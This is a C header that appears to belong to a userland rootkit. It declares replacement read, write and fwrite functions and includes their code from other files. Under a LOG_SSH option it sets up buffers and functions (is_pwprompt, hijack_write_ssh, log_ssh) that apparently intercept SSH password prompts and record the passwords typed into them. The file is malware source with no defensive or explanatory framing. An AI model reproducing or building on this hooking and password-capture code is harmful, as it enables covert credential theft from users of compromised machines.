#ifndef RW_H
#define RW_H

#ifdef LOG_SSH
int ssh_start, ssh_pass_size;
char ssh_args[512], ssh_pass[512];

int is_pwprompt(int fd, const void *buf);
ssize_t hijack_write_ssh(int fd, const void *buf, ssize_t o);
ssize_t log_ssh(int fd, void *buf, ssize_t o);
#include "log_ssh.c"
#endif

size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream);
size_t fwrite_unlocked(const void *ptr, size_t size, size_t nmemb, FILE *stream);
#include "fwrite.c"

ssize_t read(int fd, void *buf, size_t n);
#include "read.c"

ssize_t write(int fd, const void *buf, size_t n);
#include "write.c"
#endif
